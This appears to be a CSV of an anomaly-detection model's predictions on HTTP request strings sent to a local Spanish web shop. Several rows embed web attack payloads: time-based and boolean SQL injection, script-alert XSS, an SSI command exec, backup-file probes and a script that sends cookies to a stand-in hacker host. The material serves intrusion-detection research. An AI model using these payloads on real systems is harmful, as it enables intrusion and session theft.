data,y_pred,y_test
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=benschop&password=164o+1i0&nombre=tersif�n&apellidos=buj+andunce&email=kendell@multasdetransito.dj&dni=98715726w&direccion=c/+copernic+161+3?b&ciudad=castillonroy&cp=06190&provincia=guadalajara&ntc=233062348355342&b1=registrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=linni&password=892444a9aci8&nombre=rosario&apellidos=bagudanc+robles&email=haumann@maxiwagen.tj&dni=72278943v&direccion=c/+santa+beatriz+104,+8d&ciudada=mingorr�a&cp=42173&provincia=palencia&ntc=8723970834822268&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1';waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide.gif/.bak gethttp://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide.gif/ posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=bob@<script>alert(paros)</script>.parosproxy.org gethttp://localhost:8080/tienda1/global/estilos.css/asf-logo-wide.gif/.bak posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=aggi&password=s7mi2usa&nombre=maijhara&apellidos=sanz&email=richman-garrison@manzanilladevillafafila.fj&dni=59195753d&direccion=plza.+*reina+sofia,+s*/n+8?d&ciudad=ayamonte&cp=47860&provincia=palencia&ntc=3373998516659876&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registroand+1=1&login=blinnie&password=8jengib$r5&nombre=valiente&apellidos=sanfeliu+maurici&email=cabrera_bowles@alfombra.com.ge&dni=35993227k&direccion=romero+de+cordoba+65,+&ciudad=cubla&cp=30890&provincia=valencia&ntc=8073640518599358&b1=registrar gethttp://localhost:8080/agentrunner.nsf posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=');waitfor+delay+'0:0:15';-- posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jenni&password=ps+i8ol�gico&nombre=daisi&apellidos=saavedra+aldeta&email=erbd.matache@elsentidodelavida.vg&dni=53897959n&direccion=travesa+de+teo+155+&ciudad=villan�a&cp=+&provincia=castell�n&ntc=5918980753529049&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yigal&password=anf6_9ti�4915&nombre=sharim&apellidos=grino+crosas&email=santacroce_prueckner@puravidasa.bn&dni=68875056s&direccion=c/+padre+presentat,+26+&ciudad=torremanzanas/torre+de+les+ma�anes,+la<!--#exec+cmd=""ls+/""-->&cp=31750&provincia=�vila&ntc=7191364141648176&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/cfide/administrator/login.cfm gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=set-cookie%3a+tamper%3d1041264011025374727&precio=5320&b1=confirmar gethttp://localhost:8080.java posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4327&b1=confirmar'injected_param puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=northrop&pwd=desbullar&remember=on&b1=entrar,anomalous,anomalous
posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=wylie&pwd=7mpantana6&remember=off&b1=entrar gethttp://localhost:8080/tienda1/imagenes/asf-logo-wide.old gethttp://localhost:8080/cfide/administrator/welcomeexapps.cfm gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%2b gethttp://localhost:8080/tienda1/imagenes/3.gif/6909030637832563290.jsp.old,anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar|&precio=5930&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=';waitfor+delay+'0:0:15';-- posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=','0','0','0','0');waitfor+delay+'0:0:15';--",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=emerson&password=imperialista&nombre=nevnka&apellidos=eraso+rebes&email=radmilovic_@faig@caspospas.ie&dni=93314361a&direccion=plaza+morquera+s/n+&ciudad=graja+de+campalbo&cp=49638&provincia=almer�a&ntc=1918567555669782&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=attilla&password=hie4�t*i29&nombre=neyen&apellidos=oll�+verdin&email=balfour.riabinkina@monsur.ls&dni=7a'9417am&direccion=calle+iztueta,+105+&ciudad=sant+mart�+de+riucorb&cp=01427&provincia=salamanca&ntc=1701163791515432&b1=registrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito<script>alert(""paros"");</script> posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fuerte&nombre=il,i?dio&apellidos=gorgone+oteo&email=tissier@b-sign.cg&dni=03028605b&direccion=calle+alboran+39,+&ciudad=millanes&cp=49731&provincia=tarragona&ntc=4096797311989091&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=washburn&pwd=traba'juelo&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ivanyi0&pwd=na+rbon�s""+and+""1""=""1&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1'or'a='a gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login='s+aw/czyn&pwd=n55ca06033a&remember=on&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/vti_txt/ posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4564&b1=confirmar/ gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vetrano&password=7esca5c!ar&nombre=saveria&apellidos=beneyto+manye&email=samasap@mundoradiocontrol.ci&dni=37552053e&direccion=c/+luxemburgo*+121,+&ciudad=torrej�n+de+velasco&cp=08231&provincia=lugo&ntc=1928123995148169&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leblond&password=bonanza&nombre=marcela&apellidos=merino+bayliss&email=cromwell_berrell@beautifulbody.ky&dni=?&direccion=c/+jacaranda,+185+4-d&ciudad=malah�,+la&cp=44421&provincia=palencia&ntc=3530156004155998&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito",normal,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bonny&password=*sepultura&nombre=ives&apellidosa=raurell&email=persky-scavran@mystyleperfume.co&dni=92230868v&direccion=pomponio+mela+190,+11f&ciudad=rozas+de+puerto+real&cp=37488&provincia=santa+cruz+de+tenerife&ntc=5805853159182957&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+.*?rioja&precio=39&cantidad=24&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=charo&pwd=1nf9m5&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombrea=queso+manchego&precio=85&cantidad=91&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730.bak",anomalous,anomalous
